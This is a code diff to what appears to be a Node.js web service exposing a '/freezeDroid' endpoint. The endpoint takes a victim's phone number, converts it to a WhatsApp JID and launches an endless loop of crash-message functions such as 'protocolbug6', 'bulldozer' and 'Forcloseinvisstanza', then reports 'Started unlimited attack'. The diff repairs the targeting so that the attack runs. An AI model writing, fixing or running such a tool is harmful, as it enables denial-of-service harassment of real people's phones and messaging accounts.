@@ -63,6 +63,14 @@ app.get('/freezeDroid', async (req, res) => {
         return res.status(400).send('Phone number you have provided is invalid');
     }
 
+    
+
+    // Convert target to JID
+    const jid = toWhatsAppJID(target);
+    if (!jid) {
+        return res.status(400).send('Failed to convert phone number to WhatsApp JID');
+    }
+
     // Original functions as provided
     async function protocolbug6(target, mention) {
         const quotedMessage = {
@@ -473,34 +481,34 @@ app.get('/freezeDroid', async (req, res) => {
     }
 
     // Function to run the sequence of attacks
-    async function runAttackSequence(target) {
+    async function runAttackSequence(jid) {
         while (true) {
-            await Forcloseinvisstanza(target);
-            await protocolbug6(target);
-            await bulldozer(target);
-            await protocolbug6(target);
-            await TrashProtocol(target);
-            await Forcloseinvisstanza(target);
-            await bulldozer(target);
-            await protocolbug6(target);
-            await invisfc(target);
-            await protocolbug6(target);
-            await TrashProtocol(target);
-            await Forcloseinvisstanza(target);
-            await bulldozer(target);
-            await TrashProtocol(target);
-            await bulldozer(target);
-            await Forcloseinvisstanza(target);
-            await TrashProtocol(target);
-            await invisfc(target);
-            await protocolbug6(target);
+            await Forcloseinvisstanza(jid);
+            await protocolbug6(jid);
+            await bulldozer(jid);
+            await protocolbug6(jid);
+            await TrashProtocol(jid);
+            await Forcloseinvisstanza(jid);
+            await bulldozer(jid);
+            await protocolbug6(jid);
+            await invisfc(jid);
+            await protocolbug6(jid);
+            await TrashProtocol(jid);
+            await Forcloseinvisstanza(jid);
+            await bulldozer(jid);
+            await TrashProtocol(jid);
+            await bulldozer(jid);
+            await Forcloseinvisstanza(jid);
+            await TrashProtocol(jid);
+            await invisfc(jid);
+            await protocolbug6(jid);
         }
     }
 
     try {
         res.send(`Started unlimited attack on the number ${target}`);
-        // Start the attack sequence in the background
-        runAttackSequence(target).catch(error => {
+        // Start the attack sequence in the background with JID
+        runAttackSequence(jid).catch(error => {
             console.error('Error in attack sequence:', error.message);
         });
     } catch (error) {
